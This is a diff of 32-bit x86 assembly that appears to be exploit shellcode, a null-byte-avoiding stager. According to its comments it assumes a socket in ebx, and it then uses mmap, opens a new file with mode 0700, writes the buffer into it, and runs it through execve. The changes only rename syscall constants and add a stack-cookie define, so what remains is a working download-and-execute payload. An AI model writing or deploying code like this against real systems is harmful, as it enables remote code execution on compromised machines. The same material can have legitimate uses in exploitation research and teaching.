@@ -7,11 +7,11 @@
 BITS 32
 	global main
 	
-	%include "../include/syscalls32.s"
+	%include "short32.s"
 
 	%define openflags 0x42 ; O_CREAT|O_RDWR
 	%define size 0xffff
-
+	%define stackcookie [gs:0x14]
 
 	; assumption - ebx has the input (socket)
 		
@@ -35,7 +35,7 @@ main:
 	mov ebx, ebp 		; ebx = 0
 	mov edx, ebp  		
 	mov dl, 0x3 		; edx = 3
-	mov al, __NR_mmap
+	mov al, mmap
 	int 0x80 		; call mmap
 
 	; (temp assignment)
@@ -53,7 +53,7 @@ main:
 	mov edx, eax	
 	mov dl, 0x7
 	shl dl, 0x6		; edx = 111000000 = 0700
-	mov al, __NR_open 
+	mov al, open 
 	int 0x80 		; call open 
 
 	; write(output, buffer, size)
@@ -61,7 +61,7 @@ main:
 	mov ecx, edi 		; ecx = buffer
 	mov edx, esi 		; edx = size
 	xor eax, eax
-	mov al, __NR_write
+	mov al, write
 	int 0x80 		; call write 
 	
 	; execve(filename, 0, 0) 
@@ -69,7 +69,6 @@ main:
 	xor ecx, ecx
 	mov edx, ecx
 	mov eax, ecx
-	mov al, __NR_execve
+	mov al, execve
 	int 0x80
 
-	
